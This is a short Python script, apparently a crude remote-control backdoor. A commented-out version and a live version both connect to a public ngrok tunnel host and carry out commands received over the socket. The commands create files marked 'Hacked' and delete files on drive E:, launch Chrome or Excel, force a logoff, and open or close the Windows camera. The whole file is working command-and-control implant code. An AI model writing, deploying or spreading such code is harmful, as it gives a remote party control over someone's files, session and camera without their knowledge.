# import socket
# import os
# s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
# host='6.tcp.in.ngrok.io'
# port=14777
# s.connect((host,port))
# con=True
# while con:
# 	get_m=s.recv(1024)
# 	msg=get_m.decode()
# 	print("\nRececie : "+msg)
# 	if(msg=="quit"):
# 		con=False
# 		s.close()
# 	elif(msg=="create file"):
# 		with open("E:\\file1.txt","w")as file:
# 			file.write("Hacked")
# 	elif(msg=="delete file"):
# 		os.remove("E:\\file1.txt")
# 	elif(msg=="loop create file"):
# 		for i in range(10):
# 			with open("E:\\"+str(i+1)+".txt","w")as file:
# 				file.write("File "+str(i+1))
# 	elif(msg=="loop delete file"):
# 		for i in range(10):
# 			os.remove("E:\\"+str(i+1)+".txt")
# 	elif(msg=="excel"):
# 		os.system("start excel")
# 	elif(msg=="chrome"):
# 		os.system("start chrome")
# 	elif(msg=="stop excel"):
# 		os.system("taskkill /im excel.exe")
# 	elif(msg=="shut"):
# 		os.system('shutdown -l')
# 	elif(msg=="open camera"):
# 		os.system("start microsoft.windows.camera:")
# 	elif(msg=="close camera"):
# 		os.system("taskkill /F /IM WindowsCamera.exe")






import socket
from threading import Thread
import os
conn=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
host='2.tcp.ngrok.io'
port=17202
conn.connect((host,port))
class receive(Thread):
	def run(self):
		while True:
			get_m=conn.recv(1024)
			msg=get_m.decode()
			if(msg=="chrome"):
				os.system("start chrome")
			elif(msg=="create file"):
				with open("E:\\file1.txt","w")as file:
					file.write("Hacked")
			elif(msg=="delete file"):
				os.remove("E:\\file1.txt")
			elif(msg=="loop create file"):
				for i in range(10):
					with open("E:\\"+str(i+1)+".txt","w")as file:
						file.write("File "+str(i+1))
			elif(msg=="loop delete file"):
				for i in range(10):
					os.remove("E:\\"+str(i+1)+".txt")
			elif(msg=="chrome"):
				os.system("start chrome")
			elif(msg=="shut"):
				os.system('shutdown -l')
			elif(msg=="open camera"):
				os.system("start microsoft.windows.camera:")
			elif(msg=="quit"):
				conn.close()
			elif(msg=="close camera"):
				os.system("taskkill /F /IM WindowsCamera.exe")
t2=receive()
t2.start()